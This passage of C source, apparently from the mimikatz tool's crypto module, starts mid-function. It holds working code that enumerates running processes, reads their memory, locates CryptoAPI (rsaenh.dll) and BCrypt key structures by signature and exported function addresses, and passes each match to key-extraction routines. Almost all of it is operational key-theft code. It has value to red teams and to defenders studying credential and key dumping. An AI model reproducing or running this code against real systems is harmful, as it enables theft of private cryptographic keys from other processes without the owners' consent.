  DWORD v4, v5, v6;
  v4 = ((bits + 7) >> 3) & 7;
  v5 = (bits + 15) >> 4;
  v6 = 8 - v4;
  if(v4)
    v6 += 8;
  return 10 * ((v6 >> 1) + v5 + 2);
}

BOOL CALLBACK kuhl_m_crypto_extract_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
{
	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aRemote = {pMemoryBasicInformation->BaseAddress, ps->hMemory}, aKey = aRemote;
	PBYTE cur, limite;
	DWORD size = 
		#ifdef _M_X64
		(ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? FIELD_OFFSET(KIWI_CRYPTKEY64, KiwiProv) : FIELD_OFFSET(KIWI_CRYPTKEY32, KiwiProv);
		#else
		FIELD_OFFSET(KIWI_CRYPTKEY32, KiwiProv);
		#endif
	
	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
	{
		if(aLocalBuffer.address = LocalAlloc(LPTR, pMemoryBasicInformation->RegionSize))
		{
			limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize - size;
			if(kull_m_memory_copy(&aLocalBuffer, &aRemote, pMemoryBasicInformation->RegionSize))
			{
				for(cur = (PBYTE) aLocalBuffer.address; cur < limite; cur += (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? sizeof(DWORD64) : sizeof(DWORD32))
				{
					if(
						#ifdef _M_X64
						RtlEqualMemory(cur, (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? (PVOID) &ps->ProcessKiwiCryptKey64 : (PVOID) &ps->ProcessKiwiCryptKey32, size)
						#else
						RtlEqualMemory(cur, &ps->ProcessKiwiCryptKey32, size)
						#endif
					)
					{
						if(ps->currPid != ps->prevPid)
						{
							ps->prevPid = ps->currPid;
							kprintf(L"\n%wZ (%u)\n", ps->processName, ps->currPid);
						}
						aKey.address = cur + ((PBYTE) aRemote.address - (PBYTE) aLocalBuffer.address);
						#ifdef _M_X64
						if(ps->Machine == IMAGE_FILE_MACHINE_AMD64)
							kuhl_m_crypto_extractor_capi64(&aKey);
						else
						#endif
							kuhl_m_crypto_extractor_capi32(&aKey);
					}
				}
			}
			LocalFree(aLocalBuffer.address);
		}
	}
	return TRUE;
}

BOOL CALLBACK kuhl_m_crypto_extract_exports_callback_module_exportedEntry32(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg)
{
	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
	if(pExportedEntryInformations->name)
	{
		if(_stricmp(pExportedEntryInformations->name, "CPGenKey") == 0)
			ps->ProcessKiwiCryptKey32.CPGenKey = PtrToUlong(pExportedEntryInformations->function.address);
		else if(_stricmp(pExportedEntryInformations->name, "CPDeriveKey") == 0)
			ps->ProcessKiwiCryptKey32.CPDeriveKey = PtrToUlong(pExportedEntryInformations->function.address);
		else if(_stricmp(pExportedEntryInformations->name, "CPDestroyKey") == 0)
			ps->ProcessKiwiCryptKey32.CPDestroyKey = PtrToUlong(pExportedEntryInformations->function.address);
		else if(_stricmp(pExportedEntryInformations->name, "CPSetKeyParam") == 0)
			ps->ProcessKiwiCryptKey32.CPSetKeyParam = PtrToUlong(pExportedEntryInformations->function.address);
		else if(_stricmp(pExportedEntryInformations->name, "CPGetKeyParam") == 0)
			ps->ProcessKiwiCryptKey32.CPGetKeyParam = PtrToUlong(pExportedEntryInformations->function.address);
		else if(_stricmp(pExportedEntryInformations->name, "CPExportKey") == 0)
			ps->ProcessKiwiCryptKey32.CPExportKey = PtrToUlong(pExportedEntryInformations->function.address);
		else if(_stricmp(pExportedEntryInformations->name, "CPImportKey") == 0)
			ps->ProcessKiwiCryptKey32.CPImportKey = PtrToUlong(pExportedEntryInformations->function.address);
		else if(_stricmp(pExportedEntryInformations->name, "CPEncrypt") == 0)
			ps->ProcessKiwiCryptKey32.CPEncrypt = PtrToUlong(pExportedEntryInformations->function.address);
		else if(_stricmp(pExportedEntryInformations->name, "CPDecrypt") == 0)
			ps->ProcessKiwiCryptKey32.CPDecrypt = PtrToUlong(pExportedEntryInformations->function.address);
		else if(_stricmp(pExportedEntryInformations->name, "CPDuplicateKey") == 0)
			ps->ProcessKiwiCryptKey32.CPDuplicateKey = PtrToUlong(pExportedEntryInformations->function.address);

		ps->bAllProcessKiwiCryptKey = ps->ProcessKiwiCryptKey32.CPGenKey && ps->ProcessKiwiCryptKey32.CPDeriveKey && ps->ProcessKiwiCryptKey32.CPDestroyKey && ps->ProcessKiwiCryptKey32.CPSetKeyParam &&
			ps->ProcessKiwiCryptKey32.CPGetKeyParam && ps->ProcessKiwiCryptKey32.CPExportKey && ps->ProcessKiwiCryptKey32.CPImportKey && ps->ProcessKiwiCryptKey32.CPEncrypt &&
			ps->ProcessKiwiCryptKey32.CPDecrypt && ps->ProcessKiwiCryptKey32.CPDuplicateKey;
	}
	return !ps->bAllProcessKiwiCryptKey;
}
#ifdef _M_X64
BOOL CALLBACK kuhl_m_crypto_extract_exports_callback_module_exportedEntry64(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg)
{
	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
	if(pExportedEntryInformations->name)
	{
		if(_stricmp(pExportedEntryInformations->name, "CPGenKey") == 0)
			ps->ProcessKiwiCryptKey64.CPGenKey = (DWORD64) pExportedEntryInformations->function.address;
		else if(_stricmp(pExportedEntryInformations->name, "CPDeriveKey") == 0)
			ps->ProcessKiwiCryptKey64.CPDeriveKey = (DWORD64) pExportedEntryInformations->function.address;
		else if(_stricmp(pExportedEntryInformations->name, "CPDestroyKey") == 0)
			ps->ProcessKiwiCryptKey64.CPDestroyKey = (DWORD64) pExportedEntryInformations->function.address;
		else if(_stricmp(pExportedEntryInformations->name, "CPSetKeyParam") == 0)
			ps->ProcessKiwiCryptKey64.CPSetKeyParam = (DWORD64) pExportedEntryInformations->function.address;
		else if(_stricmp(pExportedEntryInformations->name, "CPGetKeyParam") == 0)
			ps->ProcessKiwiCryptKey64.CPGetKeyParam = (DWORD64) pExportedEntryInformations->function.address;
		else if(_stricmp(pExportedEntryInformations->name, "CPExportKey") == 0)
			ps->ProcessKiwiCryptKey64.CPExportKey = (DWORD64) pExportedEntryInformations->function.address;
		else if(_stricmp(pExportedEntryInformations->name, "CPImportKey") == 0)
			ps->ProcessKiwiCryptKey64.CPImportKey = (DWORD64) pExportedEntryInformations->function.address;
		else if(_stricmp(pExportedEntryInformations->name, "CPEncrypt") == 0)
			ps->ProcessKiwiCryptKey64.CPEncrypt = (DWORD64) pExportedEntryInformations->function.address;
		else if(_stricmp(pExportedEntryInformations->name, "CPDecrypt") == 0)
			ps->ProcessKiwiCryptKey64.CPDecrypt = (DWORD64) pExportedEntryInformations->function.address;
		else if(_stricmp(pExportedEntryInformations->name, "CPDuplicateKey") == 0)
			ps->ProcessKiwiCryptKey64.CPDuplicateKey = (DWORD64) pExportedEntryInformations->function.address;

		ps->bAllProcessKiwiCryptKey = ps->ProcessKiwiCryptKey64.CPGenKey && ps->ProcessKiwiCryptKey64.CPDeriveKey && ps->ProcessKiwiCryptKey64.CPDestroyKey && ps->ProcessKiwiCryptKey64.CPSetKeyParam &&
			ps->ProcessKiwiCryptKey64.CPGetKeyParam && ps->ProcessKiwiCryptKey64.CPExportKey && ps->ProcessKiwiCryptKey64.CPImportKey && ps->ProcessKiwiCryptKey64.CPEncrypt &&
			ps->ProcessKiwiCryptKey64.CPDecrypt && ps->ProcessKiwiCryptKey64.CPDuplicateKey;
	}
	return !ps->bAllProcessKiwiCryptKey;
}
#endif

const BYTE Bcrypt64[] = {0x20, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55}, Bcrypt64_old[] = {0x18, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55};
const BYTE Bcrypt32[] = {0x14, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55}, Bcrypt32_old[] = {0x10, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55};
BOOL CALLBACK kuhl_m_crypto_extract_MemoryAnalysisBCrypt(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
{
	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aRemote = {pMemoryBasicInformation->BaseAddress, ps->hMemory}, aKey = aRemote;
	PBYTE cur, limite;
	DWORD size = 
		#ifdef _M_X64
		(ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? sizeof(Bcrypt64) : sizeof(Bcrypt32);
		#else
		sizeof(Bcrypt32);
		#endif
	
	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
	{
		if(aLocalBuffer.address = LocalAlloc(LPTR, pMemoryBasicInformation->RegionSize))
		{
			limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize - size;
			if(kull_m_memory_copy(&aLocalBuffer, &aRemote, pMemoryBasicInformation->RegionSize))
			{
				for(cur = (PBYTE) aLocalBuffer.address; cur < limite; cur += (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? sizeof(DWORD64) : sizeof(DWORD32))
				{
					if(
						#ifdef _M_X64
						RtlEqualMemory(cur, (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ?
						((MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt64_old : Bcrypt64)
						:
						((MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32)
						, size)
						#else
						RtlEqualMemory(cur, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32, size) 
						#endif
					)
					{
						if(ps->currPid != ps->prevPid)
						{
							ps->prevPid = ps->currPid;
							kprintf(L"\n%wZ (%u)\n", ps->processName, ps->currPid);
						}
						aKey.address = cur + ((PBYTE) aRemote.address - (PBYTE) aLocalBuffer.address);
						#ifdef _M_X64
						if(ps->Machine == IMAGE_FILE_MACHINE_AMD64)
							kuhl_m_crypto_extractor_bcrypt64(&aKey);
						else
						#endif
							kuhl_m_crypto_extractor_bcrypt32(&aKey);
					}
				}
			}
			LocalFree(aLocalBuffer.address);
		}
	}
	return TRUE;
}

BOOL CALLBACK kuhl_m_crypto_extract_ProcessAnalysis(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
{
	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
	HANDLE hProcess;
	DWORD pid = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
	PEB Peb;
	PIMAGE_NT_HEADERS pNtHeaders;
	KULL_M_MEMORY_ADDRESS aRemote = {NULL, NULL};
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION cryptInfos;
	if((pid > 4) && (pid != ps->myPid))
	{
		if(hProcess = OpenProcess(GENERIC_READ, FALSE, pid))
		{
			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aRemote.hMemory))
			{
				ps->hMemory = aRemote.hMemory;
				if(kull_m_process_peb(aRemote.hMemory, &Peb, FALSE))
				{
					aRemote.address = Peb.ImageBaseAddress;
					if(kull_m_process_ntheaders(&aRemote, &pNtHeaders))
					{
						if(kull_m_process_getVeryBasicModuleInformationsForName(aRemote.hMemory, L"rsaenh.dll", &cryptInfos))
						{
							ps->Machine = pNtHeaders->FileHeader.Machine;
							ps->bAllProcessKiwiCryptKey = FALSE;
							RtlZeroMemory(&ps->ProcessKiwiCryptKey32, sizeof(KIWI_CRYPTKEY32));
							#ifdef _M_X64
							RtlZeroMemory(&ps->ProcessKiwiCryptKey64, sizeof(KIWI_CRYPTKEY64));
							#endif
							if(
								#ifdef _M_X64
									NT_SUCCESS(kull_m_process_getExportedEntryInformations(&cryptInfos.DllBase, (pNtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) ? kuhl_m_crypto_extract_exports_callback_module_exportedEntry64 : kuhl_m_crypto_extract_exports_callback_module_exportedEntry32, pvArg))
								#else
									NT_SUCCESS(kull_m_process_getExportedEntryInformations(&cryptInfos.DllBase, kuhl_m_crypto_extract_exports_callback_module_exportedEntry32, pvArg))
								#endif
								&& ps->bAllProcessKiwiCryptKey)
							{
								ps->currPid = pid;
								ps->processName = &pSystemProcessInformation->ImageName;
								kull_m_process_getMemoryInformations(aRemote.hMemory, kuhl_m_crypto_extract_MemoryAnalysis, pvArg);
							}
						}

						if(MIMIKATZ_NT_MAJOR_VERSION > 5)
						{
							if(kull_m_process_getVeryBasicModuleInformationsForName(aRemote.hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"bcrypt.dll" : L"bcryptprimitives.dll", &cryptInfos))
							{
								ps->Machine = pNtHeaders->FileHeader.Machine;
								ps->bAllProcessKiwiCryptKey = FALSE;
								ps->currPid = pid;
								ps->processName = &pSystemProcessInformation->ImageName;
								kull_m_process_getMemoryInformations(aRemote.hMemory, kuhl_m_crypto_extract_MemoryAnalysisBCrypt, pvArg);
							}
						}
						LocalFree(pNtHeaders);
					}
				}
				kull_m_memory_close(aRemote.hMemory);
			}
			CloseHandle(hProcess);
		}
	}
	return TRUE;
}

NTSTATUS kuhl_m_crypto_extract(int argc, wchar_t * argv[])
{
	KIWI_CRYPT_SEARCH searchData = {NULL, 0, {0}, 
	#ifdef _M_X64
	{0}, 
	#endif
	FALSE, GetCurrentProcessId(), 0, 0, NULL};
	kull_m_process_getProcessInformation(kuhl_m_crypto_extract_ProcessAnalysis, &searchData);
	return STATUS_SUCCESS;
}